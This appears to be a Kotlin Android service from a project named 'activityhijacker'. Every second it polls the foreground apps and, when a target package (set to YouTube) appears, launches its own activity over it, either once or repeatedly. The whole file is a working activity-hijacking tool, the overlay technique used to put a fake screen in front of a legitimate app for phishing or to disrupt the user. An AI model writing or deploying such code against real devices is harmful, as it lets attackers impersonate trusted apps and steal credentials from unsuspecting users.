package io.ivan.activityhijacker.service

import android.app.Service
import android.content.Intent
import android.os.IBinder
import com.jaredrummler.android.processes.AndroidProcesses
import io.ivan.activityhijacker.activity.HijackingActivity
import java.util.*
import kotlin.concurrent.timerTask

////////////////////////////////////////////////////////////////////////////////////////////////////
const val U_WANT_TO_HIJACK = "com.google.android.youtube"
const val HIJACK_ONLY_ONE = false
////////////////////////////////////////////////////////////////////////////////////////////////////

class HijackingService : Service() {

    private val hijackedList by lazy { ArrayList<String>() }
    private val sadStories by lazy { HashMap<String, Class<out Any>>() }
    private val timer by lazy { Timer() }

    private var isStart = false

    private val task = timerTask {

        AndroidProcesses.getRunningForegroundApps(baseContext)
                .asSequence()
                .filter { sadStories.containsKey(it.packageName) }
                .forEach {
                    if (HIJACK_ONLY_ONE)
                        hijackingOnce(it.packageName)
                    else
                        hijacking(it.packageName)
                }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!isStart) {
            sadStories.put(U_WANT_TO_HIJACK, HijackingActivity::class.java)
            timer.schedule(task, 0, 1000)
            isStart = true
        }
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        isStart = false
        hijackedList.clear()
        timer.cancel()
    }

    override fun onBind(p0: Intent?): IBinder = null!!

    private fun hijackingOnce(paramAnonymousString: String) {
        if (!hijackedList.contains(paramAnonymousString)) {
            val intent = Intent(this, sadStories[paramAnonymousString])
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            hijackedList.add(paramAnonymousString)
        }
    }

    private fun hijacking(paramAnonymousString: String) {
        val intent = Intent(this, sadStories[paramAnonymousString])
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
    }


}
